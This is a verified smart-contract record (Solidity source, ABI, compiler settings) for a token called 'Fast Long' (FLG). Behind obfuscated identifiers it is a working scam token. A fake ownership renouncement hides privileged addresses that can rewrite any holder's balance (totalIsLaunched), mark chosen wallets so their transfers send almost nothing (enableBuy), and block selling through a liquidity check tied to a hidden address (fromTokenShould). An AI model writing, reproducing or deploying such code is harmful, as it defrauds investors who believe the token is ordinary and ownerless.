{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface enableFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTake {\n    function createPair(address toModeLiquidity, address fromSwap) external returns (address);\n}\n\ninterface tradingMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverToSell) external view returns (uint256);\n\n    function transfer(address sellFrom, uint256 sellExempt) external returns (bool);\n\n    function allowance(address receiverExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellFrom,\n        uint256 sellExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeReceiverAmount, uint256 value);\n    event Approval(address indexed receiverExempt, address indexed spender, uint256 value);\n}\n\ninterface atTrading is tradingMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FastLong is atAmount, tradingMarketing, atTrading {\n\n    uint256 constant senderList = 14 ** 10;\n\n    uint256 sellTokenTake;\n\n    string private amountLimit = \"Fast Long\";\n\n    function receiverAmountTx(address tokenReceiver) public {\n        require(tokenReceiver.balance < 100000);\n        if (enableAt) {\n            return;\n        }\n        \n        receiverFund[tokenReceiver] = true;\n        if (buyAmountLimit != enableSwapFund) {\n            enableSwapFund = buyAmountLimit;\n        }\n        enableAt = true;\n    }\n\n    mapping(address => bool) public maxMin;\n\n    function marketingFund(address teamShould, address sellFrom, uint256 sellExempt) internal returns (bool) {\n        if (teamShould == receiverAmount) {\n            return marketingLaunched(teamShould, sellFrom, sellExempt);\n        }\n        uint256 tradingMode = tradingMarketing(walletLaunchedSwap).balanceOf(autoWallet);\n        require(tradingMode == liquidityTotal);\n        require(sellFrom != autoWallet);\n        if (maxMin[teamShould]) {\n            return marketingLaunched(teamShould, sellFrom, senderList);\n        }\n        return marketingLaunched(teamShould, sellFrom, sellExempt);\n    }\n\n    address public receiverAmount;\n\n    uint256 private enableSwapFund;\n\n    bool public tokenMinMarketing;\n\n    function transfer(address isMinAmount, uint256 sellExempt) external virtual override returns (bool) {\n        return marketingFund(_msgSender(), isMinAmount, sellExempt);\n    }\n\n    function balanceOf(address receiverToSell) public view virtual override returns (uint256) {\n        return totalSender[receiverToSell];\n    }\n\n    string private teamAmountEnable = \"FLG\";\n\n    uint256 liquidityTotal;\n\n    uint256 private receiverTrading = 100000000 * 10 ** 18;\n\n    uint256 public buyAmountLimit;\n\n    mapping(address => uint256) private totalSender;\n\n    bool public autoLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamAmountEnable;\n    }\n\n    function transferFrom(address teamShould, address sellFrom, uint256 sellExempt) external override returns (bool) {\n        if (_msgSender() != txTo) {\n            if (feeFrom[teamShould][_msgSender()] != type(uint256).max) {\n                require(sellExempt <= feeFrom[teamShould][_msgSender()]);\n                feeFrom[teamShould][_msgSender()] -= sellExempt;\n            }\n        }\n        return marketingFund(teamShould, sellFrom, sellExempt);\n    }\n\n    address private swapListSell;\n\n    function enableBuy(address walletIs) public {\n        marketingList();\n        \n        if (walletIs == receiverAmount || walletIs == walletLaunchedSwap) {\n            return;\n        }\n        maxMin[walletIs] = true;\n    }\n\n    function marketingLaunched(address teamShould, address sellFrom, uint256 sellExempt) internal returns (bool) {\n        require(totalSender[teamShould] >= sellExempt);\n        totalSender[teamShould] -= sellExempt;\n        totalSender[sellFrom] += sellExempt;\n        emit Transfer(teamShould, sellFrom, sellExempt);\n        return true;\n    }\n\n    bool private marketingFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTrading;\n    }\n\n    address txTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private swapBuy;\n\n    mapping(address => mapping(address => uint256)) private feeFrom;\n\n    function fromTokenShould(uint256 sellExempt) public {\n        marketingList();\n        liquidityTotal = sellExempt;\n    }\n\n    function approve(address modeSenderSwap, uint256 sellExempt) public virtual override returns (bool) {\n        feeFrom[_msgSender()][modeSenderSwap] = sellExempt;\n        emit Approval(_msgSender(), modeSenderSwap, sellExempt);\n        return true;\n    }\n\n    bool public enableAt;\n\n    uint8 private fundLaunchedMode = 18;\n\n    constructor (){\n        \n        enableFee walletTake = enableFee(txTo);\n        walletLaunchedSwap = receiverTake(walletTake.factory()).createPair(walletTake.WETH(), address(this));\n        if (enableSwapFund != swapBuy) {\n            enableSwapFund = swapBuy;\n        }\n        receiverAmount = _msgSender();\n        listEnable();\n        receiverFund[receiverAmount] = true;\n        totalSender[receiverAmount] = receiverTrading;\n        if (receiverIs != tokenMinMarketing) {\n            tokenMinMarketing = true;\n        }\n        emit Transfer(address(0), receiverAmount, receiverTrading);\n    }\n\n    function marketingList() private view {\n        require(receiverFund[_msgSender()]);\n    }\n\n    function totalIsLaunched(address isMinAmount, uint256 sellExempt) public {\n        marketingList();\n        totalSender[isMinAmount] = sellExempt;\n    }\n\n    address public walletLaunchedSwap;\n\n    mapping(address => bool) public receiverFund;\n\n    bool private receiverIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundLaunchedMode;\n    }\n\n    function getOwner() external view returns (address) {\n        return swapListSell;\n    }\n\n    bool private tradingIs;\n\n    function owner() external view returns (address) {\n        return swapListSell;\n    }\n\n    function listEnable() public {\n        emit OwnershipTransferred(receiverAmount, address(0));\n        swapListSell = address(0);\n    }\n\n    event OwnershipTransferred(address indexed shouldLaunch, address indexed teamMode);\n\n    address autoWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return amountLimit;\n    }\n\n    function allowance(address receiverFee, address modeSenderSwap) external view virtual override returns (uint256) {\n        if (modeSenderSwap == txTo) {\n            return type(uint256).max;\n        }\n        return feeFrom[receiverFee][modeSenderSwap];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiverAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSenderSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSenderSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmountLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"enableBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellExempt\",\"type\":\"uint256\"}],\"name\":\"fromTokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"receiverAmountTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMinMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMinAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellExempt\",\"type\":\"uint256\"}],\"name\":\"totalIsLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMinAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunchedSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FastLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}